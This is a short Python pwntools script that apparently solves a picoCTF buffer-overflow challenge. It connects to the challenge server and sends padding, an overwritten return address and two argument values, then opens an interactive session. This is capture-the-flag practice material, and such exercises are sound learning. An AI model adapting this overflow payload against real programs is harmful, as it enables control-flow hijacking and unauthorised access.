#! /usr/bin/python3


from pwn import *

HOST = 'saturn.picoctf.net'
PORT = 62302

p = remote(HOST, PORT)

p.sendlineafter(b'Please enter your string: \n', b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaab\x96\x92\x04\x08\x00\x00\x00\x00\x0d\xf0\xfe\xca\x0d\xf0\x0d\xf0')
# print(p.recvline())
# print(p.recvline())
p.interactive()